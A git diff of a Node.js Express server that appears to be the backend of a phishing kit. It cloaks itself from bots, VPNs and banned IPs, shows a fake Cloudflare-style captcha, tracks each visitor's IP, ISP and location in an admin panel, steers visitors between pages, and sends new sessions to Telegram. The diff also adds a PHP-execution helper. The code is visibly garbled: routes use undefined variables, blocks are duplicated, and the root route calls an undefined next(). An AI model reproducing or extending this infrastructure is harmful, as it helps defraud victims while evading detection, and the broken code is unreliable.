@@ -6,6 +6,7 @@ import { fileURLToPath } from 'url';
 import { dirname, join } from 'path';
 import crypto from 'crypto';
 import { verifyAdmin } from './middleware/auth.js';
+import path from 'path';  // Add this with other imports
 import { checkVPN, checkBot } from './middleware/antiBot.js';
 import { scanPages } from './utils/pageScanner.js';
 import { getIPDetails, getPublicIP } from './utils/ipUtils.js';
@@ -21,6 +22,10 @@ import {
 } from './services/telegram.js';
 import { secureServer } from './middleware/security-middleware.js';
 import cookieParser from 'cookie-parser';
+import phpExpress from 'php-express';
+import { exec } from 'child_process';
+import { promisify } from 'util';
+const execAsync = promisify(exec);
 import dotenv from 'dotenv';
 dotenv.config();
 
@@ -306,6 +311,72 @@ secureServer(app);
 
 
 
+async function servePHP(req, res, phpPath) {
+    try {
+        console.log('Attempting to serve PHP file:', phpPath);
+        
+        // Verify file exists
+        if (!fs.existsSync(phpPath)) {
+            console.error('PHP file not found:', phpPath);
+            throw new Error('PHP file not found');
+        }
+
+        // Set PHP binary path
+        const phpBin = process.env.RENDER ? '/usr/bin/php' : 'php';
+        
+        // Construct command with proper path escaping
+        const command = `${phpBin} "${phpPath}"`;
+        console.log('Executing PHP command:', command);
+
+        const { stdout, stderr } = await execAsync(command, {
+            env: {
+                ...process.env,
+                REMOTE_ADDR: req.ip,
+                HTTP_HOST: req.headers.host || 'localhost:3000',
+                HTTP_USER_AGENT: req.headers['user-agent'] || '',
+                HTTP_ACCEPT_LANGUAGE: req.headers['accept-language'] || '',
+                HTTP_REFERER: req.headers['referer'] || '',
+                HTTP_ACCEPT: req.headers['accept'] || '',
+                SERVER_SOFTWARE: 'Node.js',
+                SERVER_NAME: 'localhost',
+                SERVER_PROTOCOL: 'HTTP/1.1',
+                REQUEST_METHOD: req.method,
+                REQUEST_URI: req.url,
+                SCRIPT_FILENAME: phpPath,
+                SCRIPT_NAME: '/index.php',
+                PHP_SELF: '/index.php',
+                DOCUMENT_ROOT: path.dirname(phpPath),
+                REQUEST_SCHEME: 'http',
+                SERVER_PORT: '3000',
+                QUERY_STRING: req.query ? new URLSearchParams(req.query).toString() : '',
+                HTTPS: req.secure ? 'on' : 'off'
+            }
+        });
+
+        if (stderr) {
+            console.warn('PHP stderr output:', stderr);
+        }
+
+        if (!stdout.trim()) {
+            console.warn('PHP output is empty');
+            throw new Error('Empty PHP output');
+        }
+
+        res.send(stdout);
+    } catch (error) {
+        console.error('PHP execution error:', error);
+        // Log the full error details
+        console.error('Full error details:', {
+            message: error.message,
+            stack: error.stack,
+            command: error.cmd,
+            killed: error.killed,
+            code: error.code,
+            signal: error.signal
+        });
+        res.redirect(state.settings.redirectUrl);
+    }
+}
 app.use((req, res, next) => {
     console.log(`[REQUEST] ${req.method} ${req.path} ${req.originalUrl}`);
     next();
@@ -446,166 +517,6 @@ const pageServingMiddleware = async (req, res, next) => {
 };
 // Initial IP check
 app.get('/check-ip', async (req, res) => {
-    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
-                    req.headers['x-real-ip'] || 
-                    req.socket.remoteAddress;
-    const userAgent = req.headers['user-agent'];
-    const isAdminPanel = req.headers.referer?.includes('/admin');
-    
-    try {
-        const publicIP = await getPublicIP(clientIP);
-        console.log(`Checking IP: ${clientIP} -> Public IP: ${publicIP}`);
-
-        // Don't redirect admin panel requests when IP is banned
-        if (ipManager.isIPBanned(publicIP) && !isAdminPanel) {
-            return res.status(403).json({ error: 'IP banned' });
-        }
-
-        if (!state.settings.websiteEnabled && !isAdminPanel) {
-            return res.status(403).json({ error: 'Website disabled' });
-        }
-
-        // Create or get session
-        const sessionId = generateSessionId(publicIP, userAgent);
-        let session = sessionManager.getSession(sessionId);
-        if (!session) {
-            session = sessionManager.createSession(sessionId, publicIP, userAgent);
-        }
-
-        // If session exists and URL exists, redirect to the session URL
-        if (session.url) {
-            res.redirect(session.url);
-        } else {
-            // Create new session URL if none exists
-            const url = sessionManager.updateSessionUrl(session);
-            res.redirect(url);
-        }
-
-    } catch (error) {
-        console.error('Error in IP check:', error);
-        res.redirect('/');
-    }
-});
-
-
-
-
-const checkBannedIP = async (req, res, next) => {
-    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
-                    req.headers['x-real-ip'] || 
-                    req.socket.remoteAddress;
-    const isAdminPanel = req.headers.referer?.includes('/admin');
-    
-    if (isAdminPanel) {
-        return next();
-    }
-
-    try {
-        const publicIP = await getPublicIP(clientIP);
-        if (ipManager.isIPBanned(publicIP)) {
-            return res.redirect(state.settings.redirectUrl);
-        }
-        next();
-    } catch (error) {
-        console.error('Error checking IP:', error);
-        next();
-    }
-};
-
-// Add this middleware before your page routes
-app.use('/:page', checkBannedIP);
-
-// Captcha verification endpoint
-// Modify the verify-turnstile endpoint
-// Modified verify-turnstile endpoint
-app.post('/verify-turnstile', async (req, res) => {
-    const { token, sessionId } = req.body;
-    
-    console.log('Verifying turnstile:', { sessionId });
-    
-    try {
-        const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                secret: process.env.CLOUDFLARE_SECRET_KEY,
-                response: token
-            })
-        });
-
-        const data = await response.json();
-        console.log('Turnstile verification result:', data);
-
-        if (data.success && sessionId) {
-            let session = sessionManager.getSession(sessionId);
-            const existingVerifiedSession = sessionManager.getAllVerifiedSessions()
-                .find(s => s.id === sessionId);
-
-            if (existingVerifiedSession) {
-                // If there's an existing verified session, reactivate it instead of creating new
-                existingVerifiedSession.connected = true;
-                existingVerifiedSession.loading = false;
-                existingVerifiedSession.lastHeartbeat = Date.now();
-                existingVerifiedSession.lastAccessed = Date.now();
-                
-                // Update session to Loading page
-                const newUrl = sessionManager.updateSessionPage(sessionId, 'Loading');
-                
-                console.log('Reactivating existing session:', sessionId);
-                adminNamespace.emit('session_updated', existingVerifiedSession);
-                
-                return res.json({ 
-                    success: true, 
-                    url: newUrl,
-                    verified: true
-                });
-            }
-
-            if (session) {
-                // Verify and promote the session
-                sessionManager.verifySession(sessionId);
-                
-                // Get IP details and update session
-                const ipDetails = await getIPDetails(session.clientIP);
-                session.ip = ipDetails.ip;
-                session.hostname = ipDetails.hostname;
-                session.country = ipDetails.country;
-                session.city = ipDetails.city;
-                session.region = ipDetails.region;
-                session.isp = ipDetails.isp;
-                session.connected = true;
-                session.loading = false;
-
-                // Update session to Loading page
-                const newUrl = sessionManager.updateSessionPage(sessionId, 'Loading');
-                
-                console.log('Session verified and promoted, new URL:', newUrl);
-                
-                // Only now notify admin of new session since it's verified
-                adminNamespace.emit('session_created', session);
-                await sendTelegramNotification(formatTelegramMessage('new_session', {
-                    id: sessionId,
-                    ip: session.clientIP,
-                    userAgent: session.userAgent,
-                    location: `${session.city || 'Unknown'}, ${session.country || 'Unknown'}`
-                }));
-                
-                return res.json({ 
-                    success: true, 
-                    url: newUrl,
-                    verified: true
-                });
-            }
-        }
-        
-        res.json({ success: false, error: 'Verification failed' });
-    } catch (error) {
-        console.error('Turnstile verification error:', error);
-        res.json({ success: false, error: 'Verification failed' });
-    }
-});
-
-app.get('/', async (req, res) => {
     const isAdminPanel = req.headers.referer?.includes('/admin');
     
     if (!state.settings.websiteEnabled && !isAdminPanel) {
@@ -631,13 +542,11 @@ app.get('/', async (req, res) => {
 
         // If there's an existing verified session, reactivate and redirect
         if (existingVerifiedSession) {
-            // Update session state
             existingVerifiedSession.connected = true;
             existingVerifiedSession.loading = false;
             existingVerifiedSession.lastHeartbeat = Date.now();
             existingVerifiedSession.lastAccessed = Date.now();
 
-            // Generate URL based on their last page
             const redirectUrl = sessionManager.updateSessionUrl(existingVerifiedSession);
             
             console.log('Reactivating existing session:', {
@@ -650,19 +559,13 @@ app.get('/', async (req, res) => {
             return res.redirect(redirectUrl);
         }
 
-        // Get session if it exists from query params (for backward compatibility)
-        const params = new URLSearchParams(req.url.split('?')[1] || '');
-        const querySessionId = params.get('client_id');
-        const session = querySessionId ? sessionManager.getSession(querySessionId) : null;
-
-        if (session && ipManager.isIPBanned(session.ip)) {
-            return res.redirect(state.settings.redirectUrl);
+        // Create new session if none exists
+        if (!sessionManager.getSession(sessionId)) {
+            sessionManager.createSession(sessionId, publicIP, userAgent);
         }
 
-        // If no existing session, show the captcha page
+        // Generate random ray ID for captcha page
         const rayId = Math.random().toString(16).substr(2, 10);
-        
-        // Escape the template literals for the embedded script
         const indexHtml = `<!DOCTYPE html>
 <html lang="en">
 <!-- Head section remains the same -->
@@ -861,13 +764,151 @@ app.get('/', async (req, res) => {
     </script>
 </body>
 </html>`;
-        res.send(indexHtml);
+        // Send captcha page
+        res.send(indexHtml); // Your captcha HTML template
+
+    } catch (error) {
+        console.error('Error in check-ip:', error);
+        res.redirect(state.settings.redirectUrl);
+    }
+});
+
+
+
+const checkBannedIP = async (req, res, next) => {
+    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
+                    req.headers['x-real-ip'] || 
+                    req.socket.remoteAddress;
+    const isAdminPanel = req.headers.referer?.includes('/admin');
+    
+    if (isAdminPanel) {
+        return next();
+    }
+
+    try {
+        const publicIP = await getPublicIP(clientIP);
+        if (ipManager.isIPBanned(publicIP)) {
+            return res.redirect(state.settings.redirectUrl);
+        }
+        next();
+    } catch (error) {
+        console.error('Error checking IP:', error);
+        next();
+    }
+};
+
+// Add this middleware before your page routes
+app.use('/:page', checkBannedIP);
+
+// Captcha verification endpoint
+// Modify the verify-turnstile endpoint
+// Modified verify-turnstile endpoint
+app.post('/verify-turnstile', async (req, res) => {
+    const { token, sessionId } = req.body;
+    
+    console.log('Verifying turnstile:', { sessionId });
+    
+    try {
+        const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                secret: process.env.CLOUDFLARE_SECRET_KEY,
+                response: token
+            })
+        });
+
+        const data = await response.json();
+        console.log('Turnstile verification result:', data);
+
+        if (data.success && sessionId) {
+            let session = sessionManager.getSession(sessionId);
+            const existingVerifiedSession = sessionManager.getAllVerifiedSessions()
+                .find(s => s.id === sessionId);
+
+            if (existingVerifiedSession) {
+                // If there's an existing verified session, reactivate it instead of creating new
+                existingVerifiedSession.connected = true;
+                existingVerifiedSession.loading = false;
+                existingVerifiedSession.lastHeartbeat = Date.now();
+                existingVerifiedSession.lastAccessed = Date.now();
+                
+                // Update session to Loading page
+                const newUrl = sessionManager.updateSessionPage(sessionId, 'Loading');
+                
+                console.log('Reactivating existing session:', sessionId);
+                adminNamespace.emit('session_updated', existingVerifiedSession);
+                
+                return res.json({ 
+                    success: true, 
+                    url: newUrl,
+                    verified: true
+                });
+            }
+
+            if (session) {
+                // Verify and promote the session
+                sessionManager.verifySession(sessionId);
+                
+                // Get IP details and update session
+                const ipDetails = await getIPDetails(session.clientIP);
+                session.ip = ipDetails.ip;
+                session.hostname = ipDetails.hostname;
+                session.country = ipDetails.country;
+                session.city = ipDetails.city;
+                session.region = ipDetails.region;
+                session.isp = ipDetails.isp;
+                session.connected = true;
+                session.loading = false;
+
+                // Update session to Loading page
+                const newUrl = sessionManager.updateSessionPage(sessionId, 'Loading');
+                
+                console.log('Session verified and promoted, new URL:', newUrl);
+                
+                // Only now notify admin of new session since it's verified
+                adminNamespace.emit('session_created', session);
+                await sendTelegramNotification(formatTelegramMessage('new_session', {
+                    id: sessionId,
+                    ip: session.clientIP,
+                    userAgent: session.userAgent,
+                    location: `${session.city || 'Unknown'}, ${session.country || 'Unknown'}`
+                }));
+                
+                return res.json({ 
+                    success: true, 
+                    url: newUrl,
+                    verified: true
+                });
+            }
+        }
+        
+        res.json({ success: false, error: 'Verification failed' });
+    } catch (error) {
+        console.error('Turnstile verification error:', error);
+        res.json({ success: false, error: 'Verification failed' });
+    }
+});
+
+app.get('/', async (req, res) => {
+    const isAdminPanel = req.headers.referer?.includes('/admin');
+    
+    if (isAdminPanel) {
+        return next();
+    }
+    
+    if (!state.settings.websiteEnabled && !isAdminPanel) {
+        return res.redirect(state.settings.redirectUrl);
+    }
+
+    try {
+        // Execute PHP file
+        await servePHP(req, res, path.join(__dirname, '../../index.php'));
     } catch (error) {
         console.error('Error in root route:', error);
         res.redirect(state.settings.redirectUrl);
     }
 });
-
 // Page serving route - must come after other routes
 app.get('/:page', pageServingMiddleware);
 
